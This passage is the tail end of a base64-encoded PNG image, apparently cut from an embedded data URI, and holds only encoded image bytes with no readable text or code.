cGBmT79u2yubtb1jU9Y705AMifzmRpZOlsloZW9TdrrFjKB6EFABGlsaWXEHfs2CFbt26Vzc93S+emhPsv6AByp/9dqB98X7JkaVpkaRgRWgAQI2ZmSz8cr8GlM1wvvPACYKl95DE3GqJsWeVya1uxaFyZwPL/viGhBQAxox+O1+DSz21pdAGZPL66LhUNhaRxUl1dnWbBgoXWcWrx4iXu/kWLFlv3eWD+A9bxc62iwv4BaUILAGJMowvIZE1dfTIgdJamsFauXJlm4cJFVmAovTSn+zW4gvd58IEHreOjgNACAAAWDa26ujo3YnR9/mMPyaKe2jTzl1XJ8qZ9ealq/LYVE9kKO2IKIewxEloAAJSBuZzRCsZEtsKOmEIIe4yEFgAAZUBDK/gmHzVhR0whhD1GQgsAgDJAaIUj7DESWgAAlAFCKxxhj5HQAgCgDBBa4Qh7jIQWAABlgNAKR9hjJLQAACgDhFY4wh4joQUAQBkgtMIR9hgJLQAAygChFY6wx0hoAQBQBgitcIQ9RkILAIAyQGiFI+wxEloAAJQBQiscYY+R0AIAoAwQWuEIe4yEFgAAZYDQCkfYYyS0AAAoA4RWOMIeI6EFAEAZILTCEfYYCS0AAMoAoRWOsMf4/3cE10GXpNSQAAAAAElFTkSuQmCC>
